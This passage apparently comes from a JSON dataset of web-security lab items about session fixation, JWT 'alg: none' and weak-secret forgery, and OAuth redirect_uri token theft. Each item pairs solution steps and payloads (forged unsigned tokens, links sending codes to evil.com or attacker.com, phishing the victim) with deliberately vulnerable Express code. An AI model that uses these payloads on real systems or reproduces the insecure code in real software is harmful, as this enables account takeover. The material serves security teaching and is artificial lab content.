    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { if (req.query.session) { req.sessionID = req.query.session; } res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { req.session.user = req.body.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account details for ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "/login?session=abc123",
      "abc123",
      "GET /my-account Cookie: connect.sid=abc123"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via 'none' algorithm",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication. It trusts the 'alg' header of incoming tokens without validation. If the algorithm is set to 'none', the server skips signature verification. To solve: Forge a JWT token with 'none' algorithm to gain access to Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid JWT token after login",
      "Decode the JWT token using jwt.io or Burp JWT editor",
      "Modify the payload to impersonate user 'carlos' and set 'alg' to 'none' in the header",
      "Remove the signature completely and base64 encode the new token",
      "Send a request to /my-account with Authorization: Bearer [forged-token] and verify access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (authHeader) { const token = authHeader.split(' ')[1]; try { req.user = jwt.decode(token); } catch (e) { return res.status(401).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user && req.user.username) res.send(`Welcome ${req.user.username}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Token: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect",
    "Lab Description": "The application uses OAuth for authentication but fails to validate the redirect_uri parameter strictly. An attacker can manipulate this parameter to redirect the OAuth authorization code to their own server and steal access tokens. To solve: Capture Carlos's access token by injecting a malicious redirect_uri.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp Suite and intercept the OAuth flow",
      "Note the request to /auth?redirect_uri=https://example.com/callback",
      "Modify the redirect_uri to point to your attacker server (e.g., https://evil.com/code-catcher)",
      "Host a temporary server (e.g., using ngrok or python3 -m http.server) to receive the token/code",
      "Send the malicious link to Carlos. When he logs in, intercept the token on your server",
      "Use the stolen access token to access /my-account as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const code = 'abc123';  res.redirect(`${redirectUri}?code=${code}`); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post('https://oauth.provider.com/token', { form: { code, client_id: '123', client_secret: 'xyz' } }, (err, resp, body) => { res.send(`Access granted with token: ${body}`); }); }); app.listen(4000);",
    "payloads": [
      "/auth?redirect_uri=https://evil.com/capture",
      "GET https://evil.com/capture?code=abc123",
      "Use token abc123 at /my-account"
    ]
  },
  {
    "Lab scenario": "REST API JWT authentication bypass via weak secret",
    "Lab Description": "The application uses JWT tokens to authenticate API users. It signs tokens using a weak secret and does not validate the 'alg' claim properly. The application exposes an endpoint that echoes back the token payload for debugging. To solve: craft a forged JWT token that grants admin access and use it to access the protected /admin endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a login request and capture the JWT token in the response.",
      "Use jwt.io or Burp Suite's JWT extension to decode and analyze the token structure and signing algorithm.",
      "Use a tool like `jwt-cracker` or `John the Ripper` to brute-force the weak secret (e.g., 'secret', 'admin123').",
      "Modify the payload to set 'role':'admin', then re-sign using the cracked secret and 'HS256' algorithm.",
      "Send the forged token in an Authorization: Bearer header to /admin and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); const secret = 'admin123'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.role === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch (e) { res.status(401).send('Invalid token'); } });",
    "payloads": [
      "HS256 token with header: {\"alg\":\"HS256\"}, payload: {\"username\":\"carlos\",\"role\":\"admin\"}, signed with 'admin123'",
      "jwt.io-generated token using known secret 'secret'",
      "Manually forged token with cracked secret using PyJWT"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Access Token Leak in Referer Header",
    "Lab Description": "The application uses the OAuth 2.0 Implicit flow for authentication. After login, it redirects the user to a third-party domain while leaking the access token in the Referer header. To solve: intercept and steal Carlos’s OAuth access token via a malicious redirect URI, then use it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the redirect URL after OAuth login and confirm token is returned in URL fragment (#access_token).",
      "Register a new OAuth client with a redirect_uri to your attacker domain (e.g., https://evil.com).",
      "Modify the /authorize request to use the attacker redirect_uri and send link to Carlos.",
      "When Carlos logs in, his browser sends the access_token in the Referer header to evil.com.",
      "Use the stolen token in Authorization header to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const redirect = req.query.redirect_uri; const token = 'access-token-carlos'; res.redirect(`${redirect}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access-token-carlos') { res.send('Carlos Account Access'); } else { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://evil.com#access_token=access-token-carlos",
      "OAuth authorize URL with redirect_uri=https://evil.com",
      "Authorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in login endpoint",
    "Lab Description": "The application generates a session ID in a cookie before login and fails to regenerate it after authentication. The session ID is predictable and can be fixed prior to victim login. To solve: set a session ID for the victim, trick them into logging in, then reuse the same ID to access their session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or browser to set a session cookie before login (e.g., sessionid=1234carlos).",
      "Send a phishing link to Carlos with the pre-set sessionid=1234carlos cookie.",
      "After Carlos logs in, revisit the site and reuse the same sessionid to access his authenticated session.",
      "Access /my-account while presenting the fixed sessionid.",
      "Verify Carlos’s account content is accessible."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const sid = req.cookies.sessionid; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid] === 'carlos') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sessionid=1234carlos",
      "Pre-login fixed session ID and reuse after login",
      "Phishing link that sets session cookie before login"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in Authorization header handling",
    "Lab Description": "This lab involves a vulnerable REST API that authenticates users based on JWTs passed via the Authorization header. The server does not verify the token signature. The application decodes the token and grants access based solely on the 'role' claim. To solve: craft a tampered JWT with elevated privileges to access the /admin/data endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a GET request to /user/profile with a valid JWT and inspect the Authorization: Bearer <JWT> header.",
      "Decode the JWT using jwt.io and inspect the payload claims.",
      "Observe that the 'alg' in the header is set to 'HS256', and the signature isn't verified server-side.",
      "Modify the JWT payload to { \"user\": \"carlos\", \"role\": \"admin\" } and change 'alg' to 'none'.",
      "Remove the signature and send the tampered token in the Authorization header to /admin/data using Postman to confirm privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.get('/admin/data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Admins only'); res.send('Sensitive admin data'); }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in authorization code grant exchange",
    "Lab Description": "This lab uses the OAuth 2.0 authorization code grant flow. The application does not validate the `redirect_uri` during the token exchange, allowing an attacker to intercept the authorization code. To solve: hijack the OAuth flow to gain an access token for Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth flow when logging in via the third-party provider.",
      "Capture the authorization code sent to your redirect_uri.",
      "Send a crafted POST request to /oauth/token using Carlos's authorization code and your own redirect_uri.",
      "Observe that the server does not validate the redirect_uri and issues you an access token.",
      "Use the stolen access token to access Carlos’s protected profile endpoint: /user/carlos/profile"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.post('/oauth/token', (req, res) => { const { code, redirect_uri } = req.body; const validCode = 'AUTHCODE123'; if (code === validCode) { return res.json({ access_token: 'access-token-for-carlos' }); } res.status(400).json({ error: 'Invalid code' }); }); app.get('/user/:id/profile', (req, res) => { if (req.headers.authorization === 'Bearer access-token-for-carlos') res.send('Carlos profile data'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
    "payloads": [
      "POST /oauth/token { code=AUTHCODE123, redirect_uri=http://attacker.com/callback }",
      "Authorization: Bearer access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "This lab implements session-based authentication using a fixed session ID passed as a cookie. The application does not regenerate session IDs upon login, enabling session fixation attacks. To solve: set a session ID cookie before login, then trick Carlos into logging in with it and reuse the session.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set a cookie manually in the browser: sessionid=abc123 before visiting the login page.",
      "Use Burp Suite to intercept the login request and observe that the session ID remains unchanged after login.",
      "Send Carlos a phishing link that sets the sessionid=abc123 and directs him to the login page.",
      "After Carlos logs in, reuse the same sessionid=abc123 cookie in your browser.",
      "Access /my-account to retrieve Carlos's account details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; app.post('/login', (req, res) => { const sid = req.cookies.sessionid; sessions[sid] = { user: 'carlos' }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.user === 'carlos') res.send('Carlos Account Info'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: sessionid=abc123",
      "GET /login with sessionid=abc123",
      "GET /my-account with sessionid=abc123 after Carlos login"
    ]
  },
  {
    "Lab scenario": "JWT tampering using alg=none in Authorization header",
    "Lab Description": "This lab's authentication mechanism relies on JSON Web Tokens (JWTs) passed in the Authorization header. The server trusts the JWT without verifying the signature if the algorithm is set to 'none'. This allows tampering with token content. The application uses the JWT's 'role' claim to grant admin access. To solve: Modify the JWT to escalate privileges and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid login and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or a local script and inspect the header and payload.",
      "Modify the JWT header: change 'alg' to 'none'. In the payload, change 'role' to 'admin'.",
      "Remove the signature portion completely and base64 encode the new header and payload.",
      "Replace the original JWT in the Authorization header with the tampered one and access the /admin page to confirm escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'pass123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.role === 'admin') return res.send('Welcome Admin'); else return res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "{\"alg\":\"none\"}.{ \"username\": \"carlos\", \"role\": \"admin\" }"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow using predictable session ID",
    "Lab Description": "This lab suffers from a session fixation vulnerability. The session ID is set before login and remains unchanged after authentication. The attacker can pre-generate a session ID and trick the victim into using it. After the victim logs in, the attacker hijacks the session. To solve: Fixate Carlos's session and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to GET /session before login and extract the session cookie.",
      "Send the session ID to the victim (simulated) and have them log in via that session.",
      "After the victim logs in, reuse the same session ID in your cookies to access the /my-account endpoint.",
      "Use Burp Suite Repeater to send GET /my-account with the fixed session ID.",
      "Confirm access to the victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user; res.redirect('/my-account'); } else res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { if (req.session?.user) return res.send(`Welcome ${req.session.user.username}`); else res.status(403).send('Login required'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login with fixed session cookie",
      "Cookie: connect.sid=sess123fixed",
      "Hijack connect.sid after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect leads to token theft",
    "Lab Description": "This lab's OAuth implementation incorrectly trusts arbitrary redirect_uris during the OAuth flow. By supplying a malicious redirect URI, an attacker can intercept the authorization code and exchange it for an access token. To solve: Capture Carlos's access token and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the OAuth authorization endpoint and confirm that any redirect_uri is accepted.",
      "Craft a malicious URL pointing the victim to the authorization endpoint with redirect_uri set to attacker.com.",
      "Simulate user click (victim logs in and consents) and intercept the authorization code sent to attacker.com.",
      "Exchange the stolen code using Postman or curl for an access token at the token endpoint.",
      "Use the access token in the Authorization header to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthClients = [{ client_id: 'trusted-app', client_secret: 'abc123' }]; app.get('/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; res.redirect(`${redirect_uri}?code=1234`); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code, client_id, client_secret } = req.body; if (code === '1234' && client_id === 'trusted-app' && client_secret === 'abc123') return res.json({ access_token: 'valid-token-for-carlos' }); res.status(400).send('Invalid request'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'valid-token-for-carlos') return res.send('Account details for Carlos'); else return res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
    "payloads": [
      "https://vulnerable.com/authorize?client_id=trusted-app&redirect_uri=https://attacker.com",
      "POST /token { code: 1234, client_id: trusted-app, client_secret: abc123 }",
      "Authorization: Bearer valid-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "RESTful JWT tampering in login endpoint",
    "Lab Description": "The application uses a JWT for authentication and verifies it using a public key. However, the algorithm field in the token header is not validated correctly, allowing attackers to manipulate it. The application blindly trusts unsigned tokens when 'alg' is set to 'none'. To solve: log in as the admin user and access the dashboard endpoint using a tampered token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT token via Postman while logging in with your own user credentials.",
      "Use jwt.io or Burp Suite to decode the token and analyze the header and payload.",
      "Change the alg field from 'RS256' to 'none' and modify the payload to {\"username\": \"admin\"}.",
      "Remove the signature section entirely and send the manipulated token in the Authorization header: Bearer <tampered_token>.",
      "Access the /admin/dashboard endpoint and confirm access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.verify(token, publicKey); if (decoded.username === 'admin') res.send('Admin access granted'); else res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Tampering Lab running...'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}, Payload: {\"username\":\"admin\"}, no signature",
      "Authorization: Bearer <base64(header)>.<base64(payload)>.",
      "Token manipulation via jwt.io with RS256 → none and admin payload"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
    "Lab Description": "This application integrates third-party OAuth authentication but fails to validate redirect URIs. An attacker can craft an authorization URL with an open redirect in the redirect_uri parameter to intercept the authorization code. To solve: obtain the victim's authorization code and exchange it for an access token, then retrieve their email.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or OWASP ZAP to intercept the OAuth flow.",
      "Craft a malicious OAuth URL with redirect_uri set to https://malicious-site.com/oauth/callback.",
      "Send this URL to the victim (can simulate by pasting directly into the browser).",
      "Once the victim authenticates, capture the authorization code from the malicious site's endpoint.",
      "Exchange the stolen code for an access token using Postman and access the /userinfo endpoint to fetch victim data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const client_id = 'app123'; res.redirect(`https://oauth-provider.com/auth?client_id=${client_id}&redirect_uri=${redirect_uri}`); }); app.get('/callback', async (req, res) => { const code = req.query.code; const token = await axios.post('https://oauth-provider.com/token', { code }); const userinfo = await axios.get('https://oauth-provider.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Logged in as ${userinfo.data.email}`); }); app.listen(4000, () => console.log('OAuth Lab running...'));",
    "payloads": [
      "https://target-site.com/auth?redirect_uri=https://evil.com/oauth/callback",
      "POST /token { code: <stolen_code> }",
      "GET /userinfo Authorization: Bearer <access_token>"
    ]
  },
  {
    "Lab scenario": "SOAP API session fixation via pre-set cookie",
    "Lab Description": "The SOAP-based login endpoint accepts pre-set session IDs via cookies. The application does not regenerate session IDs after login. This allows an attacker to fix the session ID before victim logs in, then reuse it to impersonate the session. To solve: Fix a session ID, trick the victim to use it, and access the /myAccount endpoint as the victim.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman or Burp to send a GET /init-session request with a custom session ID in Cookie: sessionId=abc123.",
      "Trick the victim to log in using the same sessionId (simulate login with cookie set).",
      "After victim logs in, reuse Cookie: sessionId=abc123 to send a GET /myAccount request.",
      "Observe that you're now authenticated as the victim.",
      "Access /myAccount to confirm session fixation worked."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const soap = require('soap'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.post('/soap-login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies['sessionId']; if (username === 'victim' && password === 'securepass') { sessions[sessionId] = username; res.send('Logged in successfully'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/myAccount', (req, res) => { const user = sessions[req.cookies['sessionId']]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running...'));",
    "payloads": [
      "Cookie: sessionId=abc123",
      "POST /soap-login with sessionId=abc123 in cookie",
      "GET /myAccount with sessionId=abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "This lab demonstrates session fixation where the session ID is accepted from the user's request instead of being regenerated after login. The application uses a session token passed as a cookie and fails to rotate it after successful authentication, allowing attackers to hijack sessions. To solve: Fixate Carlos's session, then login as him using a pre-set session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request to the login page and observe the 'sessionid' cookie being set by the client.",
      "Send a GET request to /login with a custom session ID: Cookie: sessionid=attackerSession123",
      "Log in using your own credentials and observe that the session ID is accepted and retained.",
      "Send the session fixation link with your controlled session ID to Carlos (assume simulated delivery).",
      "Once Carlos logs in via that link, reuse attackerSession123 as Cookie to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'abc123' }]; const sessions = {}; app.get('/login', (req, res) => { const sessionid = req.cookies.sessionid || req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessionid = req.cookies.sessionid; sessions[sessionid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionid = req.cookies.sessionid; const username = sessions[sessionid]; if (username === 'carlos') res.send('Welcome Carlos!'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "GET /login?sessionid=attackerSession123",
      "Cookie: sessionid=attackerSession123",
      "POST /login with username=carlos and password=abc123 using attackerSession123 cookie"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass using 'none' algorithm",
    "Lab Description": "This lab uses JWT tokens for authentication but fails to properly validate the algorithm field. It accepts tokens with the 'none' algorithm, allowing attackers to craft arbitrary tokens without a valid signature. To solve: Forge a token to impersonate Carlos and access the account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in as your own user and capture the JWT token using Burp or Postman.",
      "Decode the token using jwt.io or jwt_tool to identify the structure.",
      "Modify the payload to change 'username' to 'carlos' and set 'alg' to 'none' in the header.",
      "Remove the signature entirely and rebase64 the header and payload manually.",
      "Send the forged token in the Authorization: Bearer header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'admin123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecretkey'); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.username === 'carlos') res.send('Welcome Carlos!'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "Forged token: base64url(header) + '.' + base64url(payload) + '.'"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri validation",
    "Lab Description": "This lab simulates a vulnerable OAuth login where the redirect_uri is not properly validated. By manipulating the redirect_uri parameter, an attacker can intercept tokens issued to users. To solve: Steal Carlos's token and access the protected resource as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Burp Suite to analyze the OAuth flow when logging in via a third-party provider.",
      "Observe that redirect_uri is passed from the client and not strictly validated by the authorization server.",
      "Craft a malicious URL that points redirect_uri to your own domain: https://vulnerable.com/oauth/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
      "Convince Carlos to visit the crafted link (social engineering assumed).",
      "Intercept the token at evil.com and reuse it in an Authorization: Bearer header to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; if (client_id !== '123') return res.status(403).send('Invalid client'); const token = 'token-for-carlos';  res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-for-carlos') res.send('Welcome Carlos!'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable.com/oauth/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
      "Intercepted token: token-for-carlos",
      "GET /my-account with Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-set session cookie",
    "Lab Description": "The application uses session cookies to manage user authentication, but fails to regenerate them after login. A malicious actor can fix a known session ID before login, and force the victim to authenticate using it. The application reflects session IDs without regenerating them. To solve: hijack Carlos's session by fixing the session ID before he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite Proxy to intercept GET /login and inject your custom session cookie (e.g. sessionid=abc123).",
      "Send the login page URL to Carlos (e.g. via social engineering) with the fixed sessionid embedded via Set-Cookie.",
      "Wait for Carlos to log in, using the sessionid you supplied.",
      "After he logs in, reuse the fixed sessionid to access authenticated pages.",
      "Verify access to /my-account as Carlos to confirm exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 's3cur3' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('sessionid', req.cookies.sessionid || Math.random().toString(36), { httpOnly: true }); return res.send('Login successful'); } return res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid) return res.send('Welcome back, session: ' + req.cookies.sessionid); res.status(401).send('Please login'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "sessionid=abc123",
      "Set-Cookie: sessionid=abc123",
      "GET /login HTTP/1.1 with Cookie header injection",
      "POST /login with attacker-supplied session ID"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in authentication tokens",
    "Lab Description": "The app uses JWTs to authenticate users, but allows algorithm tampering in the header. It incorrectly trusts the 'alg' claim and accepts unsigned tokens when 'none' is specified. To solve: forge a valid token for Carlos without a signature.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT after logging in using Burp Suite or Postman.",
      "Decode the token header and change 'alg' to 'none'.",
      "Replace the 'sub' or 'username' claim to 'carlos'.",
      "Re-encode the JWT without a signature section.",
      "Submit the forged token in Authorization: Bearer header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') return res.send('Welcome Carlos'); } catch (e) { return res.status(401).send('Invalid token'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Lab running...'));",
    "payloads": [
      "Header: { \"alg\": \"none\" }, Payload: { \"username\": \"carlos\" }",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <forged-token>"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "The application uses OAuth to log in users via a third-party provider. However, it fails to validate the redirect_uri parameter correctly, enabling attackers to steal tokens. The app reflects the redirect_uri without whitelisting. To solve: intercept the OAuth flow and capture Carlos's token.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to proxy and analyze the OAuth flow.",
      "Start an OAuth login and note the authorize request with the redirect_uri parameter.",
      "Change the redirect_uri to your own server (e.g., http://evil.com/callback).",
      "Send Carlos the modified authorization URL.",
      "Intercept the redirected request containing Carlos’s token at your server and use it to access his account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query;  return res.redirect(redirect_uri + '?code=' + code); }); app.listen(4000, () => console.log('OAuth Redirect Lab running...'));",
    "payloads": [
